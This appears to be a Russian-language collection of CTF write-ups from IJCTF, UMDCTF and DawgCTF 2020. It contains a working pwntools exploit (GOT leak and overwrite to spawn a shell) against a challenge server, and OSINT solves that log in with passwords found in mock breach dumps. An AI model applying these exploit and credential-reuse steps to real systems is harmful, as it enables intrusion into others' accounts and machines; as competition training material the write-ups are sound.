# IJCTF
В выходные 25-26 апреля проходили соревнования по кибер-безопасности ijctf. Эта ctf явно не рассчитана на новичков, 
впрочем, некоторые задания решить можно, о чем мы сейчас и поговорим. 
## NIBIRU - CRYPTO
Задание Нибиру из категории криптография до самого конца ctf решило не так много людей. Но это не потому что задание 
сложное. Итак, задание встречает нас pdf файлом, в котором предоставлена шифровка и описание шифра. 
### Описание
Описание задания можно посмотреть в файле [Nibiru](Nibiru.pdf)
### Шифротекст
T jabd ql ehzrzbg dpe gkyx hwcroh em voz. Oruvc qrbhae hp ejwzwyw xjy lyat
rdra axcbvmyc, yy yycc bgujn mi huv lvlw icjp kltj rzv zhnwcxcch wp rq pxxp
wkcbwvc uumie: b vvdivdzkjam hp uaj skycul ziaqlwo, mjwznh fi iaj dhmx jdra
mqohq asbdpc hp jxeopgu xyogw. B nvyw'f wdqghr! Gaj oop qqv P dycc qkxcxwnmp
kdra k ihuamc vi pjyv fasa fkcbw mxcbvmyc. Bqv iruvc wuxxcdo frbhae hp
tubdinsyw, hjyv pr py hpp. Rckw py hppv'h xcbowie yzv lakw maj Rphrrs sakw
frynznh pygaph vakw ziaqlwo cvdivdzkjam eki kdrp gubdinsyw hpt ym vv oynz. Wy
bjy xasmwl upt udlyc dqv ryboda, cy jki mpayvkxcch i wvcgmnqn rxcw. Wr jucffh
ekdb bjy babdw, zjmccyw am li vvrexr Aytgmnqn bhzl. Tjyqozk, hy qq qhz ip
ghuiscdwrzb hi hlid mckw py jki kdgvro, K auv maj uesf tveytc qb haj oxakazb
uvsvl, ry q hvkx yy pqpoh iruvc fckw py yljgt zhcb thmyw eajcc: Giaqlwo Svkx.
Yy dzymkh faj rxcw dxcbvmyc hhrs, xhrs kivhckktjiv. P ovbugbonh prl cavhwrzb
qgusdj faj uesf tqv idxuvgzk outivgzvh pr yr eq iiuidhqngqn gofzjc. M nhtjapa
maj uesf zjcc, vi iaj vid dp uasa drjihwly, hi hlwe gspmhp optcxxc. M kpuvwhh
faj amoj bdra aaj xcqippcc gofzjc, bueasg towz yajpnrpcou uhkkbe qe rwffpe
gorelbsjmjc. Gbp qp uaj vpynhx rtlbcyonph cmfq mmuh fi whgvwh vasa doukvji
yzv mmuh.

# Решение
Из описания следует, что процедура шифрования заключается в том, что берется индекс буквы открытого текста в ключе, 
сладывается со смещением по модулю 26 и получается индекс буквы шифротекста в ключе. Новым смещением становится индекс
буквы открытого текста. Изначально смещение задается случайно (но оно в рамках от 0 до 25). Ключом в данном шифре является
перестановка латинского алфавита. 

Также нам говорят, что люди верят, что первая фраза шифротекста расшифровывается в фразу "I fear my actions may have doomed 
us all." Используем это. Пусть у нас есть 27 переменных, а именно позиция каждой буквы английского алфавита в ключе, а также
изначальное смещение. 
Каждая переменная может принимать значение от 0 до 25, а также все переменные (кроме, очевидно, изначального смещения должны 
быть различными)
С помощью изначального предположения можно составить систему уравнений,
```
offset + i = t (mod 26),
f + i = j (mod 26), 
e + f = a (mod 26), 
a + e = b (mod 26), 
r + a = d (mod 26), 
m + r = q (mod 26), 
y + m = l (mod 26), 
a + y = e (mod 26), 
c + a = h (mod 26), 
t + c = z (mod 26), 
i + t = r (mod 26), 
o + i = z (mod 26), 
n + o = b (mod 26), 
s + n = g (mod 26), 
m + s = d (mod 26), 
a + m = p (mod 26), 
y + a = e (mod 26), 
h + y = g (mod 26), 
a + h = k (mod 26), 
v + a = y (mod 26), 
e + v = x (mod 26), 
d + e = h (mod 26), 
o + d = w (mod 26), 
o + o = c (mod 26), 
m + o = r (mod 26), 
e + m = o (mod 26), 
d + e = h (mod 26), 
u + d = e (mod 26), 
s + u = m (mod 26), 
a + s = v (mod 26), 
l + a = o (mod 26), 
l + l = z (mod 26)
```
Как видно, здесь присутствуют (в том или ином виде) все переменные, а значит из этой системы можно получить 
все интересующие нас позиции. 
Первой мыслью было решить эту систему с помощью numpy.linalg, однако это был тупиковый вариант. По сути, так как 
здесь происходит сложение по модулю (причем даже не по простому!!!!), то тут будет не одно решение (как позже выяснится, 
их 12) и поэтому с numpy ничего не получилось( 
Тем не менее, решение нашлось. Если немного преобразовать систему, можно выразить все переменные через всего 2 (например, 
через переменные o и l). Таким образом можно записать алгоритм:
```python
for x_l in range(26):
	for x_o in range(26):
		x_z = (x_l + x_l) % 26
		x_c = (x_o + x_o) % 26
		x_t = (x_z - x_c) % 26 
		x_i = (x_z - x_o) % 26
		x_r = (x_i + x_t) % 26
		x_m = (x_r - x_o) % 26
		x_q = (x_m + x_r) % 26
		x_y = (x_l - x_m) % 26
		x_e = (x_o - x_m) % 26
		x_a = (x_e - x_y) % 26

		if x_o != (x_l + x_a) % 26:
			continue

		x_h = (x_a + x_c) % 26
		x_k = (x_a + x_h) % 26
		x_b = (x_a + x_e) % 26
		x_p = (x_a + x_m) % 26
		x_f = (x_a - x_e) % 26
		x_j = (x_f + x_i) % 26
		x_g = (x_h + x_y) % 26
		x_d = (x_h - x_e) % 26

		if (x_d + x_e) % 26 != x_h:
			continue

		x_s = (x_d - x_m) % 26
		x_v = (x_a + x_s) % 26
		x_x = (x_e + x_v) % 26 
		x_n = (x_b - x_o) % 26
		x_w = (x_o + x_d) % 26
		x_u = (x_m - x_s) % 26
		x_0 = (x_t - x_i) % 26

		if (x_r + x_a) % 26 != x_d or (x_s + x_n) % 26 != x_g or (x_u + x_d) % 26 != x_e or 
		   (x_v + x_a) % 26 != x_y or (x_y + x_a) % 26 != x_e:
			continue
```
Таким образом находим все возможные ключи и получаем расшифрованную фразу: 

i fear my actions may have doomed us all. after months of filling our holdwith treasure, we were about to 
set sail when word was delivered of an evengreater prize: a sarcophagus of the purest crystal, filled to 
the brim withblack pearls of immense value. a king's ransom! the men and i were overtakenwith a desire to 
find this great treasure. and after several months ofsearching, find it we did. what we didn't realize was 
that the entity thatdwelled inside that crystal sarcophagus had been searching for us as well. inour thirst
for power and wealth, we had discovered a terrible evil. it preyedupon our fears, driving us to commit horrible 
acts. finally, in an act ofdesperation to stop what we had become, i set the ship ashore on the missioncoast, 
in a cove we named after what we would soon bring there: crystal cove.we buried the evil treasure deep, deep 
underground. i concealed its locationaboard the ship and artfully protected it by an uncrackable cipher. i 
broughtthe ship here, to the top of this mountain, to stay hidden forever. i encodedthe flag with the vigenere cipher, 
ftguxi icph olxsvghwse sovonl bw dojoffdhudcytpwmq. one of the twelve equivalent keys used to decode this messagewas used.

Подбираем ключ для шифра виженера и получаем флаг: ijctf{scooby dooo homogenous system of linearcongruences}

# UMDCTF
В выходные перед ijctf мы участвовали в umdctf - соревновании, рассчитанном в основном на новичков. Далее рассмотрим несколько разборов заданий с этого соревнования
## Coal Miner - Exploitation
### Description

First to fall over when the atmosphere is less than perfect

Your sensibilities are shaken by the slightest defect

nc 161.35.8.211 9999
Author: moogboi

## Solution

Нам дан бинарник "coalminer"

```
$ file coalminer 
coalminer: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=bd336cddc0548ae0bc5e123e3932fd91be29888a, not stripped
```

```
$ checksec coalminer
[*] '/home/yodak/Documents/umdctf2020/coalminer/coalminer'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Мы можем дабавлять или печатать элементы

```
$ ./coalminer 

Welcome to the Item Database
You may choose the commands 'add' or 'print' or 'done'
> add

Enter a name: 
aaaaa
Enter a description: 
aaaa
> print

Item 1
	aaaaa
	aaaa

> done

```

Для начала разберем, как добавляются элементы, посмотрим, как фунция "AddItem" выглядит в "ghidra":

```
void AddItem(astruct *param_1)
{
  uint uVar1;
  void *pvVar2;
  long in_FS_OFFSET;
  undefined8 local_28;
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  uVar1 = param_1->number_of_items;
  pvVar2 = malloc(0x20);
  *(void **)(&param_1->description + (ulong)uVar1 * 0x10) = pvVar2;
  puts("Enter a name: ");
  gets(&param_1->name + (ulong)(uint)param_1->number_of_items * 0x10);
  puts("Enter a description: ");
  gets((char *)&local_28);
  **(undefined8 **)(&param_1->description + (ulong)(uint)param_1->number_of_items * 0x10) = local_28;
  param_1->number_of_items = param_1->number_of_items + 1;
  if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

```

Мы можем наблюдать, что эта функция выделяет 32 байта на куче для описания элемента, затем читает на стек имя элемента, читает описание в локальную переменную, а затем копирует 8 байт описания в заранее выделенную память на куче. Мы можем смело утверждать, что использование функции gets приводит в переполнению стека, но из вывода команды checksec мы поняли, что используется канарейка, которая не позволит нам просто перезаписать адрес возврата функции. Параметр, передающийся в функцию AddItem является локальной переменной в основной функции (здесь и далее так называется функция main), пожтому посмотрим, как эти переменные на самом деле хранятся. Это как стек выглядит прямо перед выходом из функции AddItem.

```
pwndbg> x/200xg $rsp
0x7fffffffdbf0:	0x0000000000602080	0x00007fffffffdc30
0x7fffffffdc00:	0x0000000062626262	0x09cea916a7582800
0x7fffffffdc10:	0x0000000000400b90	0x0000000000400b90
0x7fffffffdc20:	0x00007fffffffde50	0x0000000000400af7
0x7fffffffdc30:	0x0000000061616161	0x00000000006036b0
                        .
                        .
                        .
0x7fffffffde30:	0x0000000000000001	0x0000000000400770
```

Я ввел в качестве имени строку "aaaa", а в качестве описания "bbbb". Имя сохранилось по адресу 0x7fffffffdc30, который является адресом локальной переменной основной функции, по адресу 0x7fffffffdc38 мы можем увидеть адрес выделенной маллоком памяти, куда скопировалось описание элемента, которое размещено по адресу 0x7fffffffdc00, адрес 0x7fffffffde30 хранит количество элементов, которое увеличивается каждый раз, когда запускается жта функция. Мы можем из этого установить, что одиночный элемент является структурой, с примерно такой сигнатурой:  

```
struct Item {
    char name[8];
    char *description;
};
```
Функция PrintItems просто смотрит, сколько элементов есть (в данном случае по адресу 0x7fffffffde30) и печатает имя и описание (которое является адресом в куче) для каждого элемента. Для того, чтобы проэксплойтить эту программу, необходимо в первую очередь определить версию libc, запущенную на сервере. Мы можем использовать функцию gets, которая считывает имя элемента, чтобы перезаписать адрес описания элемента, а затем использовать функцию PrintItems (она печатает описание находящееся по адресу) чтобы прочитать адрес из GOT. Но сначала мы должны найти способ не перезаписывать этот адрес, потому что функция «addItem» сохраняет там описание, которое получает от второго gets.

```
gets((char *)&local_28);
**(undefined8 **)(&param_1->description + (ulong)(uint)param_1->number_of_items * 0x10) = local_28;
```
Для этого мы можем добавить более одного элемента и перезаписать переменную, в которой хранится количество элементов, чтобы функция «addItem» не перезаписывала адрес, который мы хотим прочитать. Скрипт, который я использовал:

```python
from pwn import *



r = remote('161.35.8.211', 9999)
puts_plt=0x602020
address=0x602010 # address that we dont care if it gets overwritten

print(r.recvuntil('> '))

r.sendline('add')
r.sendline('a'*8+p64(puts_plt)+'b'*8+p64(address)+'c'*(480)+"\x01")
r.sendline('asdf')

print(r.recvuntil('> '))

r.sendline('print')

par = r.recvuntil('> ')

puts_libc = u64(par.split("\n")[3][1:]+"\0\0")

print(hex(puts_libc))

r.close()

```
Переменная, в которой хранится количество элементов, перезаписывается на 1, увеличивается на единицу функцией «AddItem», а затем описание, полученное с помощью метода gets, записывается в 0x602010, а 0x602020 не изменяется.

Для определения версии libc я использовал https://libc.nullbyte.cat/

После этого мы можем написать реальный скрипт для эксплойта, я заменил адрес функции strcmp в GOT на функцию system, потому что она использует строку, предоставленную пользователем, в которой мы просто пишем "/b*/sh" (используется знак *, потому что читает 7 байт от пользователя)
```python
from pwn import *


r = remote('161.35.8.211', 9999)
puts_plt=0x602020
address=0x602010 # random address that we dont care if it gets overwritten
strcmp_plt=0x602050
offset_system=0x03f480
offset_puts=0x068f90

print(r.recvuntil('> '))

r.sendline('add')
r.sendline('a'*8+p64(puts_plt)+'b'*8+p64(address)+'c'*(480)+"\x01")
r.sendline('asdf')

print(r.recvuntil('> '))

r.sendline('print')

par = r.recvuntil('> ')

libc = u64(par.split("\n")[3][1:]+"\0\0")-offset_puts
print(hex(libc))

r.sendline('add')

r.sendline('a'*8+p64(strcmp_plt))
r.sendline(p64(libc+offset_system))
print(r.recvuntil('> '))

r.sendline('/b*/sh')

r.interactive()

r.close()

```
## Santa Mysterious Box
Вам дан ELF бинарник названный SantaBox. Первое, что я сделал, это запустил *file* на нем:
```
SantaBox: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=0400ccb74c0271f1ee7ddbd3c1f022466338d6f5, stripped
```
Кто сказал, что вам не следует запускать рандомные бинарники из интернета?

```
↳ $ ./SantaBox
-----------------------------------------
|                                       |
|                                       |
|                                       |
|           Santa's Mysterious          |
|             Box of Treats             |
|                                       |
|                                       |
|                                       |
|                                       |
|                                       |
-----------------------------------------
Enter code here: Secrets
You received coal!
```
Итак, для этого нужен код. Интересно, захардкожен ли флаг, поэтому я запускаю strings, но не вижу сигнатуры UMDCTF. Затем я запускаю этот бинарник через * ltrace *, чтобы увидеть, какие функции вызываются и вижу кое-что интересное.
```
__isoc99_scanf(0x55b41b261c7a, 0x7ffcb056f310, 0, 0Enter code here: abcdefghijklmnop
)                                             = 1
strcmp("\\]^_`abcdefghijk", "PH?>OA(vN/io/Zb<q.Zt+pZKm.io0x")
```

Я ввел код **abcdefghijklmnop** а strcmp показал **\\\\]^_\`abcdefghijk**.  Это показывает, что все буквы были сдвинуты на одинаковое количество знаков. Так давайте скопируем **PH?>OA(vN/io/Zb<q.Zt+pZKm.io0x** в python, произведем сдвиг на 5 и посмотрим, что будет.

```python
>>> code = 'PH?>OA(vN/io/Zb<q.Zt+pZKm.io0x'
>>> ''.join((chr(ord(x)+5) for x in code))
'UMDCTF-{S4nt4_gAv3_y0u_Pr3nt5}'
```
# DawgCTF 2020
В самые первые выходные мы принимали участие в DawgCTF. Оно также направлено на новичков, но там тоже было интересно!

Несколько заданий по форензике были связаны в цепочку
## Impossible Pen Test Part 1

* **Категория:** forensics (OSINT)
* **Очки:** 50

### Задание

> Welcome! We're trying to hack into Burke Defense Solutions & Management, and we need your help. Can you help us find the password of an affiliate's CEO somewhere on the internet and use it to log in to the corporate site? https://theinternet.ctf.umbccd.io/
> 
> (no web scraping is required to complete this challenge)
> 
> author: pleoxconfusa

### Решение

На корпоративном вебсайте `https://theinternet.ctf.umbccd.io/burkedefensesolutions.html` можно увидеть следующее сообщение.

```
A message from our CEO
Special thanks to Todd Turtle from Combined Dumping & Co for babysitting our kids!

Special thanks to Mohamed Crane from Babysitting, LLC for helping us take out the trash!

Special thanks to Sonny Bridges from Oconnell Holdings for freeing up our finances!

Special thanks to Emery Rollins from Combined Finance, Engineering, Scooping, Polluting, and Dumping, Incorporated for helping make the world a better place!

- Truman Gritzwald, CEO
```

На персональной страничке Emery Rollins `` можно увидеть пост, повествующий о сливе данных.

```
OMG just found out about the charriottinternational data breach repo!
```

Судя по всему, несколько людей, которые были упомянуты в сообщении CEO используют этот отель.

Поиск по утечке выдал: `https://theinternet.ctf.umbccd.io/SecLists/charriottinternational.txt`.

Электронную почту можно посмотреть на корпоративных страницах пользователей.

```
Todd Turtle
https://theinternet.ctf.umbccd.io/SyncedIn/DogeCTF%7BToddTurtle%7D.html
oxmf1yyzeka@sticky.com

Mohamed Crane
https://theinternet.ctf.umbccd.io/SyncedIn/DogeCTF%7BMohamedCrane%7D.html
cranemohameduuddyq@wemail.cc
mohamedc@chubby.com

Sonny Bridges
https://theinternet.ctf.umbccd.io/SyncedIn/DogeCTF%7BSonnyBridges%7D.html
bseok@parcel.com

Emery Rollins
https://theinternet.ctf.umbccd.io/SyncedIn/DogeCTF%7BEmeryRollins%7D.html
rollinsemery@wemail.com
emeryrdzbiu@shy.com
```

В утечке можно найти пароль к аккаунту Sonny Briges


```
bseok@parcel.com        fr33f!n@nc3sf0r@ll!
```

Попытка залогинится с этим паролем выдаст нам флаг.

```
DawgCTF{th3_w3@k3s7_1!nk}
```

## Impossible Pen Test Part 2

* **Категория:** forensics (OSINT)
* **Очки:** 50

### Задание

> Welcome! We're trying to hack into Burke Defense Solutions & Management, and we need your help. Can you help us find a disgruntled former employee somewhere on the internet (their URL will be the flag)?
> 
> https://theinternet.ctf.umbccd.io/
> 
> (no web scraping is required to complete this challenge)
> 
> author: pleoxconfusa

### Решение

На корпоративном вебсайте `https://theinternet.ctf.umbccd.io/burkedefensesolutions.html` можно раскрыть имя CEO: `Truman Gritzwald`.

На его страничке в FaceSpace `https://theinternet.ctf.umbccd.io/FaceSpace/DogeCTF%7BTrumanGritzwald%7D.html` указано, что он уволил CFO, значит он может быть разочарованным бывшим сотрудником.

```
Nov 27, 2019
About to fire my CFO!
```

Также мы можем раскрыть имя CTO, Isabela Baker, и имя Madalynn Burke.

Madalynn Burke больше CISO, в соответствии с ее профилем `https://theinternet.ctf.umbccd.io/SyncedIn/DogeCTF%7BMadalynnBurke%7D.html`.

```
01/2020 - Present
Cybersanitation Engineer - Barber Pollute and Babysitting, Limited


09/2019 - 01/2020
CISO - Burke Defense Solutions & Management
```

Но на ее страничке в FaceSpace `https://theinternet.ctf.umbccd.io/FaceSpace/DogeCTF%7BMadalynnBurke%7D.html` можно увидеть другого персонажа: Royce Joyce, CTO.

```
Sep 27, 2019
[Pictured: a hacker and some guy and my parents]
Great dinner with CTO Royce Joyce!
```

Анализируя профиль Royce Joyce `https://theinternet.ctf.umbccd.io/FaceSpace/DogeCTF%7BRoyceJoyce%7D.html` можно увидеть других людей в посте.

```
Meet the team! Carlee Booker, Lilly Lin, Damian Nevado, Tristen Winters, Orlando Sanford, Hope Rocha, and Truman Gritzwald.
```

Один из них, Tristen Winters, текущий главный офицер ИБ и на его персональной страничке `https://theinternet.ctf.umbccd.io/FaceSpace/DogeCTF%7BTristenWinters%7D.html` предупреждает о человеке Rudy Grizwald.

```
Nov 28, 2019
[Pictured: hackers]
Everyone should ignore Rudy Grizwald's messages
```

Анализируя страничку в аналоге linkedIn Rudy Grizwald-а, `https://theinternet.ctf.umbccd.io/SyncedIn/DawgCTF%7BRudyGrizwald%7D.html`, мы понимаем, что он бывший CFO.

```
11/2019 - Present
Data Breacher - Combined Teach, Inc.

1/2019 - 11/2019
Chief Financial Officer - Burke Defense Solutions & Management
```

И на персональной страничке `https://theinternet.ctf.umbccd.io/FaceSpace/DawgCTF%7BRudyGrizwald%7D.html` можно понять что он в бешенстве от CEO.

```
Nov 28, 2019
Truman Gritzwald is a bad CEO.
```

Флагом является url Rudy.

```
DawgCTF{RudyGrizwald}
```

## Impossible Pen Test Part 3

* **Категория:** forensics (OSINT)
* **Очки:** 100

### Задание

> Welcome! We're trying to hack into Burke Defense Solutions & Management, and we need your help. Can you help us find the mother of the help desk employee's name with their maiden name somewhere on the internet (the mother's URL will be the flag)?
> 
> https://theinternet.ctf.umbccd.io/
> 
> (no web scraping is required to complete this challenge)
> 
> author: pleoxconfusa

### Решение

Один из людей, раскрытых ранее, Orlando Sanford, является помошником, если судить по его профилю в SyncedIn `https://theinternet.ctf.umbccd.io/SyncedIn/DogeCTF%7BOrlandoSanford%7D.html`.

Анализируя его персональный профиль `https://theinternet.ctf.umbccd.io/FaceSpace/DogeCTF%7BOrlandoSanford%7D.html` находим пост, отсылающий к его матери.

```
Jun 01, 2018
[Pictured: Alexus Cunningham]
My mom defenestrates a cat!
```

Проверяем ее страничку `https://theinternet.ctf.umbccd.io/FaceSpace/DawgCTF%7BAlexusCunningham%7D.html` и видим, что она и правда его мать.

```
Alexus Cunningham

In a relationship with: Marely Bruce
Child: Orlando Sanford
```

Таким образом флагом является следующее.

```
DawgCTF{AlexusCunningham}
```

## Impossible Pen Test Part 4

* **Категория:** forensics (OSINT)
* **Очки:** 100

### Задание

> Welcome! We're trying to hack into Burke Defense Solutions & Management, and we need your help. Can you help us find the syncedin page of the linux admin somewhere on the internet (their URL will be the flag)?
> 
> https://theinternet.ctf.umbccd.io/
> 
> (no web scraping is required to complete this challenge)
> 
> author: pleoxconfusa

### Решение

Hope Rocha, раскрытый ранее, был Линукс админом, если судить по его профилю в SyncedIn `https://theinternet.ctf.umbccd.io/SyncedIn/DogeCTF%7BHopeRocha%7D.html`, но он не является им сейчас.

```
12/2018 - 08/2019
Linux Admin - Burke Defense Solutions & Management
```

Следуя посту на персональной страничке Hope `https://theinternet.ctf.umbccd.io/FaceSpace/DogeCTF%7BHopeRocha%7D.html` новый линукс админ Guillermo McCoy.

```
Aug 18, 2018
[Pictured: Guillermo McCoy]
Meet your new Linux Admin for Burke Defense Solutions & Management!
```

Проверяем его профиль на SyncedIn `https://theinternet.ctf.umbccd.io/SyncedIn/DawgCTF%7BGuillermoMcCoy%7D.html` и удостоверимся, что это тот, кто нам нужен.

```
Guillermo McCoy

mccoyggwe3@yam.com
2jabjj5mm3m@stupid.io
gm5f@judicious.com
guillermomm3rcr@homeschool.com
mguillermo@wemail.cc

08/2019 - Present
Linux Admin - Burke Defense Solutions & Management
```

А значит флаг это

```
DawgCTF{GuillermoMcCoy}
```

## Impossible Pen Test Part 5

* **Категория:** forensics (OSINT)
* **Очки:** 100

### Задание

> Welcome! We're trying to hack into Burke Defense Solutions & Management, and we need your help. Can you help us find the CTO's password somewhere on the internet and use it to log in to the corporate site?
> 
> https://theinternet.ctf.umbccd.io/
> 
> (no web scraping is required to complete this challenge)
> 
> author: pleoxconfusa

### Решение

Royce Joyce является CTO и имеет 2 email-а (`https://theinternet.ctf.umbccd.io/SyncedIn/DogeCTF%7BRoyceJoyce%7D.html`).

```
roycejoyce@wemail.net
jr7lp@homeschool.com
```

Анализаруя его профиль `https://theinternet.ctf.umbccd.io/FaceSpace/DogeCTF%7BRoyceJoyce%7D.html` находим утечку данных.

```
Sep 07, 2019
Apparently skayou had a data breach? LOL
```

Поиск утечки находит это: `https://theinternet.ctf.umbccd.io/SecLists/skayou.txt`.

И один из email-ов содержит пароль.

```
roycejoyce@wemail.net	c0r^3cth0rs3b@tt3ryst@p\3
```

Попытка залогинится даст нам флаг.

```
DawgCTF{xkcd_p@ssw0rds_rul3}
```
Также в цепочку были связаны несколько заданий по web-у
Задачи сортированы по мере увеличения количества очков

## Free Wi-Fi Part 1

* **Категория:** web/networking
* **Очки:** 50

### Задание

> People are getting online here, but the page doesn't seem to be implemented...I ran a pcap to see what I could find out.
> 
> http://freewifi.ctf.umbccd.io/
> 
> Authors: pleoxconfusa and freethepockets

### Решение

HTML код страницы такой.

```html
<!DOCTYPE html>
<html>
  <head>
    <title>
Guest Sign In Portal
</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- Bootstrap -->
    <link href="/static/bootstrap/css/bootstrap.min.css?bootstrap=3.3.7.1.dev1" rel="stylesheet">
	<link rel="stylesheet" href="/static/css/main.css">

  </head>
  <body>
    
    

<div class="container">
  <div class="row">
    <div align="center" class="col-xs-12">

      <h1>Sorry!</h1>

      <br><br>

      <div align="left" style="background-color: lightgrey; width: 500px;  padding: 50px;  margin: 20px;">
	<h3 style="color:blue;">Guest login</h3>
      	<p class="space-above"><strong>Guest sign in portal is not yet implemented.</strong></p>
      </div>

    </div>
  </div>
</div>



    
    <script src="/static/bootstrap/jquery.min.js?bootstrap=3.3.7.1.dev1"></script>
    <script src="/static/bootstrap/js/bootstrap.min.js?bootstrap=3.3.7.1.dev1"></script>
  </body>
</html>
```

Итак здесь некуда аутентифицироваться.

Анализируя [PCAP файл](free-wifi.pcap) мы можем увидеть пакет #6 существующей `https://freewifi.ctf.umbccd.io/staff.html` веб страницы.

Подключившись к ней, получаем флаг.

```
DawgCTF{w3lc0m3_t0_d@wgs3c_!nt3rn@t!0n@l}
```

## Free Wi-Fi Part 3

* **Категория:** web/networking
* **Очки:** 200

### Задание

> Let's steal someone's account.
> 
> http://freewifi.ctf.umbccd.io/
> 
> Authors: pleoxconfusa and freethepockets

### Решение

Страница аутентификации, которую мы получили в прошлый раз.

```html
<!DOCTYPE html>
<html>
  <head>
    <title>
Staff Wifi Login Page
</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- Bootstrap -->
    <link href="/static/bootstrap/css/bootstrap.min.css?bootstrap=3.3.7.1.dev1" rel="stylesheet">
	<link rel="stylesheet" href="/static/css/main.css">

  </head>
  <body>
    
    

<div class="container">
  <div class="row">
    <div align="center" class="col-xs-12">

      <h1>Welcome to the staff login page!</h1>

      <div align="left" style="background-color: lightgrey; width: 500px;  padding: 50px;  margin: 20px;">

        <h3 style="color:blue;">Staff login</h3>

      	<p>You may use either of the following methods to logon.</p>
	
	<div style="margin:15px;">

      	
<form action="" method="post"
  class="form" role="form">
  <input id="csrf_token" name="csrf_token" type="hidden" value="ImEwNjJmZDU1MjczNzZkMDEwMWE3OGM4MDJhZTZhZDkyOWRkMzc1Nzgi.XpD32g.A831bot0d-EhyWIW6fNX3jqIz9E">
  
    




<div class="form-group "><label class="control-label" for="username">Username:</label>
        
          <input class="form-control" id="username" name="username" type="text" value="">
        
  </div>


    




<div class="form-group "><label class="control-label" for="password">Password:</label>
        
          <input class="form-control" id="password" name="password" type="password" value="">
        
  </div>


    





  

  
  


    <input class="btn btn-default" id="submit" name="submit" type="submit" value="Submit">
  




    

</form>

      	<br/>

      	<p><a href="forgotpassword.html">Forgot your password?</a></p>

      	<h3> OR </h3>

      	
<form action="" method="post"
  class="form" role="form">
  <input id="csrf_token" name="csrf_token" type="hidden" value="ImEwNjJmZDU1MjczNzZkMDEwMWE3OGM4MDJhZTZhZDkyOWRkMzc1Nzgi.XpD32g.A831bot0d-EhyWIW6fNX3jqIz9E">
  
    






<div class="form-group  required"><label class="control-label" for="passcode">Login with WifiKey:</label>
        
          <input class="form-control" id="passcode" name="passcode" required type="text" value="">
        
  </div>


    





  

  
  


    <input class="btn btn-default" id="submit" name="submit" type="submit" value="Submit">
  




    

</form>

	</div>

      </div>

      	<p class="space-above"><strong>DawgCTF{w3lc0m3_t0_d@wgs3c_!nt3rn@t!0n@l}</strong></p>

    </div>
  </div>
</div>



    
    <script src="/static/bootstrap/jquery.min.js?bootstrap=3.3.7.1.dev1"></script>
    <script src="/static/bootstrap/js/bootstrap.min.js?bootstrap=3.3.7.1.dev1"></script>
  </body>
</html>
```

Анализируя [PCAP файл](free-wifi.pcap), можем найти несколько интересных пакетов: #469, #471 и #473.

```
POST /forgotpassword.html HTTP/1.1
Host: freewifi.ctf.umbccd.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://freewifi.ctf.umbccd.io/forgotpassword.html
Content-Type: application/x-www-form-urlencoded
Content-Length: 171
Cookie: WifiKey nonce=MjAyMC0wNC0wOCAxNzowMw==; session=eyJjc3JmX3Rva2VuIjoiYTg4ZWQxZjVkODhhZTgyZDEzMWY4ODhmZWExZjYwNDRmNTEwMDgyMCJ9.Xo35dQ.zpNEVjf6uG_5vhqwNCE7bS8QEz0
Connection: keep-alive
Upgrade-Insecure-Requests: 1

user=true.grit%40umbccd.io&csrf_token=ImE4OGVkMWY1ZDg4YWU4MmQxMzFmODg4ZmVhMWY2MDQ0ZjUxMDA4MjAi.Xo4F8w.YzjziKX2qgE4hJ5QKC6qTjP2-0M&email=true.grit%40umbccd.io&submit=Submit

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 2420
Vary: Cookie
Server: Werkzeug/1.0.1 Python/3.6.9
Date: Wed, 08 Apr 2020 17:12:19 GMT

<!DOCTYPE html>
<html>
  <head>
    <title>
Forgot your password?
</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- Bootstrap -->
    <link href="/static/bootstrap/css/bootstrap.min.css?bootstrap=3.3.7.1.dev1" rel="stylesheet">
	<link rel="stylesheet" href="/static/css/main.css">

  </head>
  <body>
    
    

<div class="container">
  <div class="row">
    <div class="col-xs-12">

      <h1>Forgot your password?</h1>

      <p class="lead">Please enter your email address.</p>
      
<form action="" method="post"
  class="form" role="form">
  <input id="user" name="user" type="hidden" value="">
<input id="csrf_token" name="csrf_token" type="hidden" value="ImE4OGVkMWY1ZDg4YWU4MmQxMzFmODg4ZmVhMWY2MDQ0ZjUxMDA4MjAi.Xo4F8w.YzjziKX2qgE4hJ5QKC6qTjP2-0M">
  
    






<div class="form-group  required"><label class="control-label" for="email">Enter your email:</label>
        
          <input class="form-control" id="email" name="email" required type="text" value="">
        
  </div>


    
    





  

  
  


    <input class="btn btn-default" id="submit" name="submit" type="submit" value="Submit">
  




    

</form>
      <script type="text/javascript">
      window.onload = function()
      {
        document.getElementsByClassName('form')[0].onsubmit = function() {
          alert(1)
          var email = document.getElementById('email')
          var user = document.getElementById('user')
          user.value = email.value
        }
      }
      </script>
      <p class="space-above"><strong>Check your email for password reset link.</strong></p>

    </div>
  </div>
</div>

<!--
TIPS about using Flask-Bootstrap:
Flask-Bootstrap keeps the default Bootstrap stylesheet in the
env/lib/python3.5/site-packages/flask_bootstrap/static/css/ directory.
You can replace the CSS file. HOWEVER, when you reinstall requirements
for your project, you would overwrite all the Bootstrap files
with the defaults.
Flask-Bootstrap templates are in
env/lib/python3.5/site-packages/flask_bootstrap/static/templates
Modifying the Bootstrap base.html template: use directives and
Jinja2's super() function. See Jinja2 documentation and also this:
https://pythonhosted.org/Flask-Bootstrap/basic-usage.html
-->



    
    <script src="/static/bootstrap/jquery.min.js?bootstrap=3.3.7.1.dev1"></script>
